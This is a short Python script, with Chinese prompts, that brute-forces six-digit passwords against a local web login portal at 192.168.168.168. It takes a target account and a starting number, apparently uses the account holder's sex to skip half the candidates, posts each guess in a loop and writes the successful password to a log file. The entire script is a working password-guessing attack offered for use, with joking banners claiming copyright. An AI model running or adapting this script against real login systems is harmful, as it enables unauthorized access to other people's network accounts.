# encoding:utf-8
import requests
import pickle
#

input("无良出品-必属精品")
input("版权所有-盗版必究")
input("最终解释权归WH所有")
username = str(input("账号"))
password = int(input("密码"))
sex = int(input("性别（1男）（2女）"))

# 123456

def getPassword():
    global password
    if sex == 1:
        if int(password / 10 % 2) == 0:
            password += 10 - password % 10
    else:
        if int(password / 10 % 2) == 1:
            password += 10 - password % 10
    t = str(password).zfill(6)
    password += 1
    return t


if __name__ == "__main__":
    url = "http://192.168.168.168/0.htm"
    i = 1
    while True:
        try:
            t = getPassword()
            data = "DDDDD={0}&upass={1}&0MKKey=%B5%C7%A1%A1%C2%BC&v6ip=".format(username, t)
            html = requests.post(url, data=data)
            html.encoding = "GB2312"
            if html.text.find("您已经成功登录") == -1:
                print("密码错:" + t)
            else:
                print("密码对:" + t)
                f = open("log", "ab")
                pickle.dump("密码对:" + t + "\n", f)
                f.close()
                input("-----------------------")
                break
        except Exception as e:
            print("网络错:" + t)
            f = open("log", "ab")
            pickle.dump(t + str(e) + "\n", f)
            f.close()